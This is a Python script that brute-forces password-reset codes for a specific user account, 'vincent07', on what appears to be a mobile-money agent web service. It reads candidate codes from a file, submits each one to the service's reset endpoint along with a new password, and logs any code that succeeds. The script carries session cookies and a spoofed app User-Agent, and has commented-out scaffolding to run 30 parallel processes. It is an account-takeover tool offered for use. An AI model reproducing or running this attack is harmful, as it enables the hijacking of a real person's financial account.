
import requests
import json
import multiprocessing as mp


def mainProg(m,n,p):

    headers = {
    'Cookie': 'route=1686662334.017.7252.75364|d95c1e926f9bdab934cee8c9235271a4; paga-webservices-canary=never',
    
    'Accept': 'application/json, text/plain, */*',
    #'Appversion': '4.0.8',
    #'Versioncode': '2072221427',
    'Content-Type': 'application/json; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10.1.1; Google Build/NQQ32Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5414.86 Mobile Safari/637.36',
    'X-Requested-With': 'com.paga.agent'
    }

    with open("5comb.txt", "r") as handle:
        lines = handle.readlines()
    i = 1
    for line in lines[m:n]:
        print(f"PROCESS==> {p}\n")
        print(f"{i}==> Trying: {line} \n")
        otp = line.strip()
        #otp = int(otp)
        payload = json.dumps({"principal":"vincent07","resetCode":otp,"password":"Kahn@123456","newPassword":"Kahn@123456"})
        url = f"https://www.mypaga.com/paga-webservices/agent-app/app-only/unsecured/resetPassword"
        #print(url)
        try:
            response = requests.post(url, headers=headers, data=payload)
            xs = response.status_code
            x = response.text
            x1 = x[16:20] #json.load(x) #x[16:18]
            print(x)
            print(f"RCODE: {x1}")
            print(f"STATUS: {xs} OK")
            #except:
                #x = "naan"
                #x1 = "nonee"

            #exit()
            if x1 != '-1,"' and xs == 200:
                print(f"PROCESS==> {p}\n")
                print(x)
                print("\n OTP Found!")
                print(line)
                print(url)
                with open("otpfound.txt", "a") as handle:
                    lisnes = handle.write(f"{line} - {x} \n")
            
            elif x1 == '-1,"':
                print("Incorrect OTP!")
            
                
            else:
                print(x)
                print(line)
                with open("otperror.txt", "a") as handle:
                    lisnes = handle.write(line)
            i += 1

        except:
            pass

if __name__ == '__main__':
    #filee = "pins.txt" #input("Enter file name: ")
    count1 = 10000/30
    
    p1 = mp.Process(target=mainProg, args=(0, int(count1), 1))
    """
    p2 = mp.Process(target=mainProg, args=(int(count1), int(count1*2), 2))
    p3 = mp.Process(target=mainProg, args=(int(count1*2), int(count1*3), 3))
    p4 = mp.Process(target=mainProg, args=(int(count1*3), int(count1*4), 4))
    p5 = mp.Process(target=mainProg, args=(int(count1*4), int(count1*5), 5))
    p6 = mp.Process(target=mainProg, args=(int(count1*5), int(count1*6), 6))
    p7 = mp.Process(target=mainProg, args=(int(count1*6), int(count1*7), 7))
    p8 = mp.Process(target=mainProg, args=(int(count1*7), int(count1*8), 8))
    p9 = mp.Process(target=mainProg, args=(int(count1*8), int(count1*9), 9))
    p10 = mp.Process(target=mainProg, args=(int(count1*9), int(count1*10), 10))
    p11 = mp.Process(target=mainProg, args=(int(count1*10), int(count1*11), 11))
    p12 = mp.Process(target=mainProg, args=(int(count1*11), int(count1*12), 12))
    p13 = mp.Process(target=mainProg, args=(int(count1*12), int(count1*13), 13))
    p14 = mp.Process(target=mainProg, args=(int(count1*13), int(count1*14), 14))
    p15 = mp.Process(target=mainProg, args=(int(count1*14), int(count1*15), 15))
    p16 = mp.Process(target=mainProg, args=(int(count1*15), int(count1*16), 16))
    p17 = mp.Process(target=mainProg, args=(int(count1*16), int(count1*17), 17))
    p18 = mp.Process(target=mainProg, args=(int(count1*17), int(count1*18), 18))
    p19 = mp.Process(target=mainProg, args=(int(count1*18), int(count1*19), 19))
    p20 = mp.Process(target=mainProg, args=(int(count1*19), int(count1*20), 20))
    p21 = mp.Process(target=mainProg, args=(int(count1*20), int(count1*21), 21))
    p22 = mp.Process(target=mainProg, args=(int(count1*21), int(count1*22), 22))
    p23 = mp.Process(target=mainProg, args=(int(count1*22), int(count1*23), 23))
    p24 = mp.Process(target=mainProg, args=(int(count1*23), int(count1*24), 24))
    p25 = mp.Process(target=mainProg, args=(int(count1*24), int(count1*25), 25))
    p26 = mp.Process(target=mainProg, args=(int(count1*25), int(count1*26), 26))
    p27 = mp.Process(target=mainProg, args=(int(count1*26), int(count1*27), 27))
    p28 = mp.Process(target=mainProg, args=(int(count1*27), int(count1*28), 28))
    p29 = mp.Process(target=mainProg, args=(int(count1*28), int(count1*29), 29))
    p30 = mp.Process(target=mainProg, args=(int(count1*29), int(count1*30), 30))
    """

    p1.start()
    """
    p2.start()
    
    p3.start()
    p4.start()
    p5.start()
    p6.start()
    p7.start()
    p8.start()
    p9.start()
    p10.start()
    p11.start()
    p12.start()
    p13.start()
    p14.start()
    p15.start()
    p16.start()
    p17.start()
    p18.start()
    p19.start()
    p20.start()
    p21.start()
    p22.start()
    p23.start()
    p24.start()
    p25.start()
    p26.start()
    p27.start()
    p28.start()
    p29.start()
    p30.start()
    """